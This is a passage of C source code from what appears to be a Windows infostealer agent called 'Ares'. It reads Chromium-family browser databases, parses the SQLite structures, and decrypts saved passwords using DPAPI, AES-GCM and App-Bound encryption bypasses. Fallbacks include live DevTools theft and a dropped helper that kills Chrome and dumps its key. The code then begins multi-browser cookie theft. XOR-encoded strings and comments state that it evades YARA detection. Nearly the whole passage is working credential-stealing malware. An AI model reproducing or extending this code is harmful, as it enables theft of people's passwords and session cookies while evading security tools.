        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] dbSize=%lu\n", dbSize); fflush(stderr);
#endif
            BYTE* db = (BYTE*)HeapAlloc(GetProcessHeap(), 0, dbSize + 1);
            if (!db) { Ares_NtClose(hDb); continue; }

            /* Read in chunks via NtReadFile */
            DWORD dbRead = 0;
            while (dbRead < dbSize) {
                ULONG chunkRead = 0;
                LARGE_INTEGER rdOffset;
                rdOffset.QuadPart = dbRead;
                ULONG toRead = (dbSize - dbRead > 65536) ? 65536 : (dbSize - dbRead);
                NTSTATUS rs = Ares_NtReadFile(hDb, db + dbRead, toRead, &rdOffset, &chunkRead);
                if (rs != 0 || chunkRead == 0) break;
                dbRead += chunkRead;
            }
            Ares_NtClose(hDb);
        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] dbRead=%lu SQLite=%c%c%c\n", dbRead, db[0], db[1], db[2]); fflush(stderr);
#endif

            /* v3.7 DET-06: Build SQLite magic at runtime — avoids YARA sig */
            char _sq[16]; _sq[0]='S';_sq[1]='Q';_sq[2]='L';_sq[3]='i';_sq[4]='t';
            _sq[5]='e';_sq[6]=' ';_sq[7]='f';_sq[8]='o';_sq[9]='r';_sq[10]='m';
            _sq[11]='a';_sq[12]='t';_sq[13]=' ';_sq[14]='3';_sq[15]='\0';
            if (dbRead < 100 || memcmp(db, _sq, 15) != 0) {
                HeapFree(GetProcessHeap(), 0, db);
                continue;
            }

            /* Page size */
            int pageSize = (db[16] << 8) | db[17];
            if (pageSize == 1) pageSize = 65536;

            int numPages = (int)(dbRead / pageSize);
        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] pageSize=%d numPages=%d\n", pageSize, numPages); fflush(stderr);
#endif

            /* ── Schema-aware: parse sqlite_master (page 1) ── */
            /*   Find 'logins' table root page + column indices   */
            int logins_root_page = -1;
            int col_url = 0, col_user = 3, col_pass = 5; /* defaults for Chrome */

            /* sqlite_master: stack-based B-tree traversal (handles 0x05 interior + 0x0D leaf) */
            if (numPages > 0) {
                int master_stack[64];
                int master_top = 0;
                master_stack[master_top++] = 1; /* sqlite_master always starts on page 1 */

                while (master_top > 0 && logins_root_page < 0) {
                    int mpgNum = master_stack[--master_top];
                    if (mpgNum < 1 || mpgNum > numPages) continue;

                    BYTE* mpg = db + ((mpgNum - 1) * pageSize);
                    int mpgOff = (mpgNum == 1) ? 100 : 0; /* page 1 header offset */
                    BYTE mpgType = mpg[mpgOff];

        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] master pg%d type=0x%02X\n", mpgNum, mpgType); fflush(stderr);
#endif

                    if (mpgType == 0x05) {
                        /* Interior table B-tree — push child pages */
                        int mncells = (mpg[mpgOff + 3] << 8) | mpg[mpgOff + 4];
                        /* Right-most child pointer */
                        int rightChild = (mpg[mpgOff + 8] << 24) | (mpg[mpgOff + 9] << 16) |
                                         (mpg[mpgOff + 10] << 8) | mpg[mpgOff + 11];
                        if (rightChild > 0 && rightChild <= numPages && master_top < 64)
                            master_stack[master_top++] = rightChild;
                        /* Cell pointers start at mpgOff + 12 */
                        for (int ci = 0; ci < mncells && master_top < 64; ci++) {
                            int cpOff = mpgOff + 12 + ci * 2;
                            int cellOff = (mpg[cpOff] << 8) | mpg[cpOff + 1];
                            if (cellOff <= 0 || cellOff >= pageSize) continue;
                            /* Interior cell: [4-byte left child] [varint rowid] */
                            int leftChild = (mpg[cellOff] << 24) | (mpg[cellOff+1] << 16) |
                                            (mpg[cellOff+2] << 8) | mpg[cellOff+3];
                            if (leftChild > 0 && leftChild <= numPages)
                                master_stack[master_top++] = leftChild;
                        }
                    }
                    else if (mpgType == 0x0D) {
                        /* Leaf table B-tree — parse sqlite_master records */
                        int mncells = (mpg[mpgOff + 3] << 8) | mpg[mpgOff + 4];
                        for (int ci = 0; ci < mncells; ci++) {
                            int coff = (mpg[mpgOff + 8 + ci*2] << 8) | mpg[mpgOff + 8 + ci*2 + 1];
                            if (coff <= 0 || coff >= pageSize) continue;

                            /* Read master cell: payload_len, rowid, then record */
                            const BYTE* mc = mpg + coff;
                            int mpos = 0;
                            INT64 mplen, mrowid;
                            mpos += read_varint(mc, mpos, pageSize - coff, &mplen);
                            mpos += read_varint(mc, mpos, pageSize - coff, &mrowid);
                            if (mplen <= 0 || mplen > 4096) continue;

                            int mavail = pageSize - coff - mpos;
                            if ((int)mplen > mavail) mplen = mavail;

                            const BYTE* mpay = mc + mpos;
                            int mhpos = 0;
                            INT64 mhlen;
                            mhpos += read_varint(mpay, mhpos, (int)mplen, &mhlen);

                            /* Parse 5 columns: type, name, tbl_name, rootpage, sql */
                            INT64 mctypes[5] = {0};
                            int mnc = 0;
                            while (mhpos < (int)mhlen && mnc < 5) {
                                mhpos += read_varint(mpay, mhpos, (int)mplen, &mctypes[mnc]);
                                mnc++;
                            }
                            if (mnc < 5) continue;

                            /* Compute column offsets */
                            int mdata_off = (int)mhlen;
                            int mco[5] = {0}, mcs[5] = {0};
                            for (int mc2 = 0; mc2 < 5; mc2++) {
                                mco[mc2] = mdata_off;
                                INT64 mt = mctypes[mc2];
                                if (mt == 0) mcs[mc2] = 0;
                                else if (mt >= 1 && mt <= 4) mcs[mc2] = (int)mt;
                                else if (mt == 5) mcs[mc2] = 6;
                                else if (mt == 6) mcs[mc2] = 8;
                                else if (mt == 7) mcs[mc2] = 8;
                                else if (mt >= 12 && mt % 2 == 0) mcs[mc2] = (int)(mt - 12) / 2;
                                else if (mt >= 13 && mt % 2 == 1) mcs[mc2] = (int)(mt - 13) / 2;
                                mdata_off += mcs[mc2];
                            }

                            /* col 1 = name (table name), col 3 = rootpage (int), col 4 = sql */
                            if (mcs[1] >= 6 && mcs[1] <= 32 && mco[1] + mcs[1] <= (int)mplen) {
                                char tbl_name[64] = {0};
                                extract_text_field(mpay, mco[1], mcs[1], tbl_name, sizeof(tbl_name));
        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] master_tbl: '%s'\n", tbl_name); fflush(stderr);
#endif
                                char _tn[8]; BYTE _tb[]={0x31,0x2F,0x10,0x73,0x67,0x4F}; _xd(_tn,_tb,6,0x5A);/*logins*/
                                if (strcmp(tbl_name, _tn) == 0) {
        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] MATCH logins! mcs[3]=%d mco[3]=%d mplen=%d\n", mcs[3], mco[3], (int)mplen); fflush(stderr);
#endif
                                    /* rootpage = int in col 3 */
                                    if (mcs[3] > 0 && mcs[3] <= 4 && mco[3] + mcs[3] <= (int)mplen) {
                                        logins_root_page = 0;
                                        for (int ri = 0; ri < mcs[3]; ri++)
                                            logins_root_page = (logins_root_page << 8) | mpay[mco[3] + ri];
        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] logins rootpage=%d\n", logins_root_page); fflush(stderr);
#endif
                                    }

                                    /* Parse CREATE TABLE sql for column indices */
                                    if (mcs[4] > 20 && mco[4] + mcs[4] <= (int)mplen) {
                                        char sql[2048] = {0};
                                        int slen = mcs[4] < 2047 ? mcs[4] : 2047;
                                        memcpy(sql, mpay + mco[4], slen);
                                        sql[slen] = '\0';

                                        char* paren = strchr(sql, '(');
                                        if (paren) {
                                            paren++;
                                            int cidx = 0;
                                            char* tok = paren;
                                            while (*tok && *tok != ')') {
                                                while (*tok == ' ' || *tok == '\n' || *tok == '\r') tok++;
                                                char cname[64] = {0};
                                                int cn = 0;
                                                while (*tok && *tok != ' ' && *tok != ',' && *tok != ')' && cn < 63)
                                                    cname[cn++] = *tok++;
                                                cname[cn] = '\0';

                                                char _ou[16]; BYTE _ob1[]={0x32,0x32,0x1E,0x7D,0x60,0x52,0x7C,0xA3,0xB7,0x84}; _xd(_ou,_ob1,10,0x5A);/*origin_url*/
                                                char _sr[16]; BYTE _ob2[]={0x2E,0x29,0x10,0x74,0x66,0x52,0x7C,0xA4,0xA0,0x89,0xF3,0xEF}; _xd(_sr,_ob2,12,0x5A);/*signon_realm*/
                                                char _uv[20]; BYTE _ob3[]={0x28,0x33,0x12,0x68,0x67,0x5D,0x4E,0xB3,0x9A,0x9E,0xFE,0xEE,0xC4,0xC1}; _xd(_uv,_ob3,14,0x5A);/*username_value*/
                                                char _pv[20]; BYTE _ob4[]={0x2D,0x21,0x04,0x69,0x7E,0x53,0x51,0xB2,0x9A,0x9E,0xFE,0xEE,0xC4,0xC1}; _xd(_pv,_ob4,14,0x5A);/*password_value*/
                                                if (strcmp(cname, _ou) == 0 || strcmp(cname, _sr) == 0) col_url = cidx;
                                                else if (strcmp(cname, _uv) == 0) col_user = cidx;
                                                else if (strcmp(cname, _pv) == 0) col_pass = cidx;

                                                while (*tok && *tok != ',' && *tok != ')') tok++;
                                                if (*tok == ',') tok++;
                                                cidx++;
                                            }
                                        }
                                    }
                                    break; /* found logins table */
                                }
                            }
                        }
                    }
                }
            }

            /* v4.3 FIX: SQL parser counts UNIQUE/PRIMARY KEY constraint tokens
             * as columns, producing bogus high indices. Chrome logins table always
             * has origin_url near col 0, username_value near col 3, password_value
             * near col 5. Reset to defaults if parsed indices are unreasonable. */
            if (col_url > 20 || col_user > 20) {
                col_url = 0; col_user = 3; col_pass = 5;
            }

            SQLITE_RECORD* records = (SQLITE_RECORD*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 500 * sizeof(SQLITE_RECORD));
            if (!records) { HeapFree(GetProcessHeap(), 0, db); continue; }
            int recordCount = 0;
        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] schema: root=%d cols=%d,%d,%d\n", logins_root_page, col_url, col_user, col_pass); fflush(stderr);
#endif

            /* ── Walk B-tree from root page ── */
            /* If we found the logins root, start there. Otherwise fall back to scanning. */
            if (logins_root_page > 0 && logins_root_page <= numPages) {
                /* Stack-based B-tree traversal (interior + leaf) */
                int page_stack[256];
                int stack_top = 0;
                page_stack[stack_top++] = logins_root_page;

                while (stack_top > 0 && recordCount < 500) {
                    int pgNum = page_stack[--stack_top];
                    if (pgNum < 1 || pgNum > numPages) continue;

                    BYTE* page = db + ((pgNum - 1) * pageSize); /* 1-indexed */
                    int pgOffset = (pgNum == 1) ? 100 : 0;

                    BYTE pageType = page[pgOffset];

                    if (pageType == 0x05) {
                        /* Interior table B-tree page */
                        int numCells = (page[pgOffset + 3] << 8) | page[pgOffset + 4];
                        /* Rightmost child pointer */
                        int rightChild = (page[pgOffset + 8] << 24) | (page[pgOffset + 9] << 16) |
                                         (page[pgOffset + 10] << 8) | page[pgOffset + 11];
                        if (rightChild > 0 && rightChild <= numPages && stack_top < 256)
                            page_stack[stack_top++] = rightChild;

                        /* Cell pointers start at pgOffset + 12 */
                        for (int c = 0; c < numCells && stack_top < 256; c++) {
                            int cpOff = pgOffset + 12 + c * 2;
                            int cellOff = (page[cpOff] << 8) | page[cpOff + 1];
                            if (cellOff <= 0 || cellOff >= pageSize) continue;

                            /* Interior cell: [4-byte left child page] [varint rowid] */
                            int leftChild = (page[cellOff] << 24) | (page[cellOff+1] << 16) |
                                            (page[cellOff+2] << 8) | page[cellOff+3];
                            if (leftChild > 0 && leftChild <= numPages)
                                page_stack[stack_top++] = leftChild;
                        }
                    }
                    else if (pageType == 0x0D) {
                        /* Leaf table B-tree page — parse records */
                        int numCells = (page[pgOffset + 3] << 8) | page[pgOffset + 4];
                        int cellPtrOffset = pgOffset + 8;
                        for (int c = 0; c < numCells && recordCount < 500; c++) {
                            int cellOff = (page[cellPtrOffset + c*2] << 8) | page[cellPtrOffset + c*2 + 1];
                            if (cellOff > 0 && cellOff < pageSize)
                                parse_btree_leaf_cell(page, cellOff, pageSize,
                                    records, 500, &recordCount,
                                    col_url, col_user, col_pass);
                        }
                    }
                }
            } else {
                /* Fallback: scan all leaf pages (unknown schema) */
                for (int pg = 0; pg < numPages && recordCount < 500; pg++) {
                    BYTE* page = db + (pg * pageSize);
                    int pgOffset = (pg == 0) ? 100 : 0;
                    BYTE pageType = page[pgOffset];
                    if (pageType != 0x0D) continue;

                    int numCells = (page[pgOffset + 3] << 8) | page[pgOffset + 4];
                    int cellPtrOffset = pgOffset + 8;
                    for (int c = 0; c < numCells && recordCount < 500; c++) {
                        int cellOff = (page[cellPtrOffset + c*2] << 8) | page[cellPtrOffset + c*2 + 1];
                        if (cellOff > 0 && cellOff < pageSize)
                            parse_btree_leaf_cell(page, cellOff, pageSize,
                                records, 500, &recordCount,
                                col_url, col_user, col_pass);
                    }
                }
            }

            /* Decrypt each record */
            for (int r = 0; r < recordCount && count < max_creds; r++) {
                SQLITE_RECORD* rec = &records[r];
                if (rec->password_len < 4) continue;

                DECRYPTED_CRED* cred = &creds[count];
                memset(cred, 0, sizeof(DECRYPTED_CRED));
                strncpy(cred->url, rec->url, sizeof(cred->url) - 1);
                strncpy(cred->username, rec->username, sizeof(cred->username) - 1);
                strncpy(cred->browser, browsers[b].name, sizeof(cred->browser) - 1);
                strncpy(cred->profile, profiles[p], sizeof(cred->profile) - 1);

                /* Check encryption version */
                if (rec->password_len > 15 && memcmp(rec->encrypted_password, "v10", 3) == 0) {
                    /* v10: AES-256-GCM (nonce=12 bytes after "v10", then ciphertext+tag) */
                    BYTE* nonce = rec->encrypted_password + 3;
                    BYTE* cipher = rec->encrypted_password + 3 + 12;
                    int cipher_len = rec->password_len - 3 - 12;

                    BYTE plaintext[512];
                    int pt_len = aes_gcm_decrypt(masterKey.key, masterKey.key_len,
                        nonce, 12, cipher, cipher_len, plaintext, sizeof(plaintext));

                    if (pt_len > 0) {
                        if (pt_len > (int)sizeof(cred->password) - 1)
                            pt_len = (int)sizeof(cred->password) - 1;
                        memcpy(cred->password, plaintext, pt_len);
                        cred->password[pt_len] = '\0';
                        strncpy(cred->decrypt_status, "ok", 15);
                        count++;
                    } else {
                        strncpy(cred->decrypt_status, "aes_fail", 15);
                    }
                }
                else if (rec->password_len > 15 && memcmp(rec->encrypted_password, "v20", 3) == 0) {
                    /* v20 (Chrome 127+): App-Bound encrypted
                     * Try: 1) IElevator COM  2) Chrome token impersonation */
                    BYTE plaintext[512];
                    int pt_len = Ares_DecryptV20_Enhanced(NULL, rec->encrypted_password,
                        rec->password_len, plaintext, sizeof(plaintext) - 1);
                    if (pt_len > 0) {
                        if (pt_len > (int)sizeof(cred->password) - 1)
                            pt_len = (int)sizeof(cred->password) - 1;
                        memcpy(cred->password, plaintext, pt_len);
                        cred->password[pt_len] = '\0';
                        strncpy(cred->decrypt_status, "ok", 15);
                    } else {
                        /* v20 decrypt failed — try AES-GCM with master key as fallback */
                        BYTE* nonce = rec->encrypted_password + 3;
                        BYTE* cipher = rec->encrypted_password + 3 + 12;
                        int cipher_len = rec->password_len - 3 - 12;
                        pt_len = aes_gcm_decrypt(masterKey.key, masterKey.key_len,
                            nonce, 12, cipher, cipher_len, plaintext, sizeof(plaintext));
                        if (pt_len > 0) {
                            if (pt_len > (int)sizeof(cred->password) - 1)
                                pt_len = (int)sizeof(cred->password) - 1;
                            memcpy(cred->password, plaintext, pt_len);
                            cred->password[pt_len] = '\0';
                            strncpy(cred->decrypt_status, "ok", 15);
                        } else {
                            strncpy(cred->password, "", sizeof(cred->password) - 1);
                            { char s[16]; DEC_STATUS_V20_BLOCKED(s); strncpy(cred->decrypt_status, s, 15); }
                        }
                    }
                    count++;
                }
                else {
                    /* Legacy DPAPI (no version prefix) */
                    BYTE plaintext[512];
                    int pt_len = dpapi_decrypt(rec->encrypted_password, rec->password_len,
                        plaintext, sizeof(plaintext));
                    if (pt_len > 0) {
                        if (pt_len > (int)sizeof(cred->password) - 1)
                            pt_len = (int)sizeof(cred->password) - 1;
                        memcpy(cred->password, plaintext, pt_len);
                        cred->password[pt_len] = '\0';
                        strncpy(cred->decrypt_status, "ok", 15);
                        count++;
                    } else {
                        strncpy(cred->decrypt_status, "dpapi_fail", 15);
                    }
                }
            }

            HeapFree(GetProcessHeap(), 0, records);
            HeapFree(GetProcessHeap(), 0, db);
        }
    }

    /* v20 fallback: decrypt passwords that failed App-Bound Encryption */
    {
        int blocked = 0;
        for (int i = 0; i < count; i++) {
            char s[16]; DEC_STATUS_V20_BLOCKED(s);
            if (strncmp(creds[i].decrypt_status, s, 15) == 0) blocked++;
        }
        if (blocked > 0) {
            /* Strategy 1: CDP-based (live Chrome DevTools → headless) */
            int got = Ares_CDP_StealLivePasswords(creds, count);
            if (got == 0) got = Ares_CDP_DecryptPasswords(creds, count);

            /* Strategy 2: chromelevator (drop → run → parse → cleanup)
             * v3.7: Re-enabled. Runs from agent directory. Agent must be
             * deployed with chromelevator_x64.exe alongside.
             * Kills Chrome → dumps master key from memory → decrypts all.
             * Cleanup: output dir is deleted after parsing. */
            if (got == 0) {
                char agentDir[MAX_PATH], clevPath[MAX_PATH+64], outDir[MAX_PATH+64];
                GetModuleFileNameA(NULL, agentDir, MAX_PATH);
                char* slash = strrchr(agentDir, '\\'); if (slash) *slash = 0;
                snprintf(clevPath, sizeof(clevPath), "%s\\chromelevator_x64.exe", agentDir);
                snprintf(outDir, sizeof(outDir), "%s\\clev_out", agentDir);
                CreateDirectoryA(outDir, NULL);

                if (GetFileAttributesA(clevPath) != INVALID_FILE_ATTRIBUTES) {
                    char cmdLine[MAX_PATH*2];
                    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" -k -o \"%s\" chrome", clevPath, outDir);
                    STARTUPINFOA si = {sizeof(si)};
                    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
                    PROCESS_INFORMATION pi2 = {0};
                    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, agentDir, &si, &pi2)) {
                        WaitForSingleObject(pi2.hProcess, 30000);
                        CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread);
                    }

                    /* Parse chromelevator output (JSON: [{url,user,pass},...]) */
                    WIN32_FIND_DATAA fd;
                    char searchPath[MAX_PATH+128];
                    snprintf(searchPath, sizeof(searchPath), "%s\\*\\passwords.json", outDir);
                    HANDLE hFind = FindFirstFileA(searchPath, &fd);
                    /* Try direct path too */
                    if (hFind == INVALID_HANDLE_VALUE) {
                        snprintf(searchPath, sizeof(searchPath), "%s\\*\\*\\passwords.json", outDir);
                        hFind = FindFirstFileA(searchPath, &fd);
                    }
                    /* Read all passwords.json files from output subdirectories */
                    {
                        char pwFiles[8][MAX_PATH+256]; int pwCount = 0;
                        /* Enumerate output directories */
                        WIN32_FIND_DATAA d2;
                        char srch2[MAX_PATH+64];
                        snprintf(srch2, sizeof(srch2), "%s\\*", outDir);
                        HANDLE h2 = FindFirstFileA(srch2, &d2);
                        if (h2 != INVALID_HANDLE_VALUE) {
                            do {
                                if (!(d2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                                if (d2.cFileName[0] == '.') continue;
                                /* Check for Browser/Profile/passwords.json */
                                WIN32_FIND_DATAA d3;
                                char srch3[MAX_PATH+128];
                                snprintf(srch3, sizeof(srch3), "%s\\%s\\*", outDir, d2.cFileName);
                                HANDLE h3 = FindFirstFileA(srch3, &d3);
                                if (h3 != INVALID_HANDLE_VALUE) {
                                    do {
                                        if (!(d3.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                                        if (d3.cFileName[0] == '.') continue;
                                        char pwPath[MAX_PATH+256];
                                        snprintf(pwPath, sizeof(pwPath), "%s\\%s\\%s\\passwords.json",
                                            outDir, d2.cFileName, d3.cFileName);
                                        if (GetFileAttributesA(pwPath) != INVALID_FILE_ATTRIBUTES && pwCount < 8) {
                                            strncpy(pwFiles[pwCount++], pwPath, sizeof(pwFiles[0])-1);
                                        }
                                    } while (FindNextFileA(h3, &d3));
                                    FindClose(h3);
                                }
                            } while (FindNextFileA(h2, &d2));
                            FindClose(h2);
                        }
                        if (hFind != INVALID_HANDLE_VALUE) FindClose(hFind);

                        /* Parse each passwords.json and update matching creds */
                        for (int pf = 0; pf < pwCount; pf++) {
                            HANDLE hPw = CreateFileA(pwFiles[pf], GENERIC_READ,
                                FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                            if (hPw == INVALID_HANDLE_VALUE) continue;
                            DWORD pwSz = GetFileSize(hPw, NULL);
                            if (pwSz > 0 && pwSz < 1024*1024) {
                                char* pwJson = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pwSz+1);
                                if (pwJson) {
                                    DWORD rd; ReadFile(hPw, pwJson, pwSz, &rd, NULL);
                                    /* Simple JSON parse: find "url":"X","user":"Y","pass":"Z" */
                                    char* pos = pwJson;
                                    while ((pos = strstr(pos, "\"url\":\"")) != NULL) {
                                        pos += 7;
                                        char* urlEnd = strchr(pos, '"'); if (!urlEnd) break;
                                        char url[512]; int ul = (int)(urlEnd-pos);
                                        if (ul > 511) ul = 511;
                                        memcpy(url, pos, ul); url[ul] = 0;

                                        char* userP = strstr(urlEnd, "\"user\":\"");
                                        if (!userP) break; userP += 8;
                                        char* userEnd = strchr(userP, '"'); if (!userEnd) break;
                                        char user[256]; int usl = (int)(userEnd-userP);
                                        if (usl > 255) usl = 255;
                                        memcpy(user, userP, usl); user[usl] = 0;

                                        char* passP = strstr(userEnd, "\"pass\":\"");
                                        if (!passP) break; passP += 8;
                                        char* passEnd = strchr(passP, '"'); if (!passEnd) break;
                                        char pass[256]; int psl = (int)(passEnd-passP);
                                        if (psl > 255) psl = 255;
                                        memcpy(pass, passP, psl); pass[psl] = 0;

                                        /* Match with blocked creds by URL+user */
                                        for (int ci = 0; ci < count; ci++) {
                                            char sv[16]; DEC_STATUS_V20_BLOCKED(sv);
                                            if (strncmp(creds[ci].decrypt_status, sv, 15) != 0) continue;
                                            if (strcmp(creds[ci].url, url) == 0 &&
                                                strcmp(creds[ci].username, user) == 0 &&
                                                pass[0]) {
                                                strncpy(creds[ci].password, pass, sizeof(creds[ci].password)-1);
                                                strncpy(creds[ci].decrypt_status, "ok", 15);
                                                got++;
                                                break;
                                            }
                                        }
                                        pos = passEnd + 1;
                                    }
                                    HeapFree(GetProcessHeap(), 0, pwJson);
                                }
                            }
                            CloseHandle(hPw);
                        }
                    }

                    /* Cleanup: delete output directory */
                    {
                        WIN32_FIND_DATAA cf;
                        char cleanPath[MAX_PATH+128];
                        snprintf(cleanPath, sizeof(cleanPath), "%s\\*", outDir);
                        /* Simple recursive delete - just remove the dir */
                        char delCmd[MAX_PATH+128];
                        snprintf(delCmd, sizeof(delCmd), "cmd /c rmdir /s /q \"%s\"", outDir);
                        STARTUPINFOA csi = {sizeof(csi)};
                        csi.dwFlags = STARTF_USESHOWWINDOW; csi.wShowWindow = SW_HIDE;
                        PROCESS_INFORMATION cpi = {0};
                        CreateProcessA(NULL, delCmd, NULL, NULL, FALSE,
                            CREATE_NO_WINDOW, NULL, NULL, &csi, &cpi);
                        if (cpi.hProcess) { WaitForSingleObject(cpi.hProcess, 5000);
                            CloseHandle(cpi.hProcess); CloseHandle(cpi.hThread); }
                    }
                }
            }
        }
    }

    return count;
}

/* ── Cookie B-Tree Record ── */

typedef struct _COOKIE_RECORD {
    char host[256];
    char name[128];
    BYTE encrypted_value[8192];
    int  value_len;
    char path[256];
    INT64 expires_utc;
    int  is_secure;
    int  is_httponly;
} COOKIE_RECORD;

/* Parse cookie leaf cell — Cookies table schema (Chrome 80+):
   col 0: creation_utc (int)
   col 1: host_key (text)
   col 2: top_frame_site_key (text)
   col 3: name (text)
   col 4: value (text) — usually empty when encrypted
   col 5: encrypted_value (blob) — this is what we want
   col 6: path (text)
   col 7: expires_utc (int)
   col 8: is_secure (int)
   col 9: is_httponly (int)
   col 10: last_access_utc (int)
   col 11: has_expires (int)
   col 12: is_persistent (int)
   col 13: priority (int)
   col 14: samesite (int)
   col 15: source_scheme (int)
   col 16: source_port (int)
   col 17: last_update_utc (int)
*/
static int parse_cookie_cell(const BYTE* page, int cell_offset, int page_size,
    COOKIE_RECORD* records, int max_records, int* record_count)
{
    const BYTE* cell = page + cell_offset;
    int pos = 0;

    INT64 payload_len;
    pos += read_varint(cell, pos, page_size - cell_offset, &payload_len);

    INT64 rowid;
    pos += read_varint(cell, pos, page_size - cell_offset, &rowid);

    if (payload_len <= 0 || payload_len > page_size) return pos + (int)payload_len;

    /* Bounds: don't read past available page data */
    int avail_ck = page_size - cell_offset - pos;
    if ((int)payload_len > avail_ck) payload_len = avail_ck;

    const BYTE* payload = cell + pos;
    int hdr_pos = 0;
    INT64 header_len;
    hdr_pos += read_varint(payload, hdr_pos, (int)payload_len, &header_len);

    INT64 col_types[20] = {0};
    int num_cols = 0;
    while (hdr_pos < (int)header_len && num_cols < 20) {
        hdr_pos += read_varint(payload, hdr_pos, (int)payload_len, &col_types[num_cols]);
        num_cols++;
    }

    /* Need at least: creation(0), host(1), top_frame(2), name(3), value(4),
       encrypted_value(5), path(6), expires(7), secure(8), httponly(9) */
    if (num_cols < 10 || *record_count >= max_records) return pos + (int)payload_len;

    int data_offset = (int)header_len;
    int col_offsets[20] = {0};
    int col_sizes[20] = {0};

    for (int c = 0; c < num_cols; c++) {
        col_offsets[c] = data_offset;
        INT64 t = col_types[c];
        if (t == 0) col_sizes[c] = 0;
        else if (t >= 1 && t <= 4) col_sizes[c] = (int)t;
        else if (t == 5) col_sizes[c] = 6;
        else if (t == 6 || t == 7) col_sizes[c] = 8;
        else if (t == 8 || t == 9) col_sizes[c] = 0; /* 0 or 1 literal */
        else if (t >= 12 && t % 2 == 0) col_sizes[c] = (int)(t - 12) / 2;
        else if (t >= 13 && t % 2 == 1) col_sizes[c] = (int)(t - 13) / 2;
        data_offset += col_sizes[c];
    }

    COOKIE_RECORD* rec = &records[*record_count];
    memset(rec, 0, sizeof(COOKIE_RECORD));

    /* host_key — col 1 */
    if (col_sizes[1] > 0 && col_types[1] >= 13 && col_offsets[1] + col_sizes[1] <= (int)payload_len)
        extract_text_field(payload, col_offsets[1], col_sizes[1], rec->host, sizeof(rec->host));

    /* name — col 3 */
    if (col_sizes[3] > 0 && col_types[3] >= 13 && col_offsets[3] + col_sizes[3] <= (int)payload_len)
        extract_text_field(payload, col_offsets[3], col_sizes[3], rec->name, sizeof(rec->name));

    /* encrypted_value — col 5 */
    if (col_sizes[5] > 0 && col_offsets[5] + col_sizes[5] <= (int)payload_len) {
        rec->value_len = col_sizes[5];
        if (rec->value_len > (int)sizeof(rec->encrypted_value))
            rec->value_len = (int)sizeof(rec->encrypted_value);
        memcpy(rec->encrypted_value, payload + col_offsets[5], rec->value_len);
    }

    /* path — col 6 */
    if (col_sizes[6] > 0 && col_types[6] >= 13 && col_offsets[6] + col_sizes[6] <= (int)payload_len)
        extract_text_field(payload, col_offsets[6], col_sizes[6], rec->path, sizeof(rec->path));

    /* expires_utc — col 7 (integer, 1-8 bytes) */
    if (col_sizes[7] > 0 && col_offsets[7] + col_sizes[7] <= (int)payload_len) {
        rec->expires_utc = 0;
        for (int i = 0; i < col_sizes[7] && i < 8; i++)
            rec->expires_utc = (rec->expires_utc << 8) | payload[col_offsets[7] + i];
    }

    /* is_secure — col 8 (type 8=0, type 9=1) */
    rec->is_secure = (col_types[8] == 9) ? 1 : 0;

    /* is_httponly — col 9 */
    rec->is_httponly = (col_types[9] == 9) ? 1 : 0;

    if (rec->host[0] != '\0' && rec->value_len > 0)
        (*record_count)++;

    return pos + (int)payload_len;
}

/* ── Real Cookie Theft: multi-browser, multi-profile, full decrypt ── */

int Ares_StealChromeCookies(STOLEN_COOKIE* cookies, int max_cookies)
{
    int count = 0;
    char localAppData[MAX_PATH];
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);

    /* v2.1: Browser paths decoded from XOR at runtime */
    char s_chrome[64], s_edge[64], s_brave[64], s_opera[64], s_vivaldi[64];
    DEC_BR_CHROME(s_chrome); DEC_BR_EDGE(s_edge);
    DEC_BR_BRAVE(s_brave); DEC_BR_OPERA(s_opera); DEC_BR_VIVALDI(s_vivaldi);

    char n_chrome[16], n_edge[16], n_brave[16], n_opera[16], n_vivaldi[16];
    DEC_LABEL_CHROME(n_chrome); DEC_LABEL_EDGE(n_edge);
    DEC_LABEL_BRAVE(n_brave); DEC_LABEL_OPERA(n_opera); DEC_LABEL_VIVALDI(n_vivaldi);

    struct { const char* name; const char* subdir; } browsers[] = {
        { n_chrome,  s_chrome },
        { n_edge,    s_edge },
        { n_brave,   s_brave },
        { n_opera,   s_opera },
        { n_vivaldi, s_vivaldi },
        { NULL, NULL }
    };

    for (int b = 0; browsers[b].name != NULL; b++) {
        char userDataDir[MAX_PATH + 64];
        snprintf(userDataDir, sizeof(userDataDir), "%s\\%s", localAppData, browsers[b].subdir);

        char localStatePath[MAX_PATH + 128];
        char s_ls[32]; DEC_LOCAL_STATE(s_ls);
        snprintf(localStatePath, sizeof(localStatePath), "%s\\%s", userDataDir, s_ls);

        if (GetFileAttributesA(localStatePath) == INVALID_FILE_ATTRIBUTES) continue;

        CHROME_KEY masterKey = extract_chrome_master_key(localStatePath);
        if (!masterKey.valid) continue;

        char s_def[16],s_p1[16],s_p2[16],s_p3[16],s_p4[16];
        DEC_DEFAULT(s_def); DEC_PROF_1(s_p1); DEC_PROF_2(s_p2);
        DEC_PROF_3(s_p3); DEC_PROF_4(s_p4);
        const char* profiles[] = { s_def, s_p1, s_p2, s_p3, s_p4, NULL };

        for (int p = 0; profiles[p] != NULL && count < max_cookies; p++) {
            /* Try both old path and new Network/ path (v2.2: encrypted) */
            char s_nc[32]; DEC_NETWORK_COOKIES(s_nc);
            char s_ck[16]; DEC_COOKIES(s_ck);

            char cookie_path1[MAX_PATH + 196];
            char cookie_path2[MAX_PATH + 196];
            snprintf(cookie_path1, sizeof(cookie_path1), "%s\\%s\\%s", userDataDir, profiles[p], s_nc);
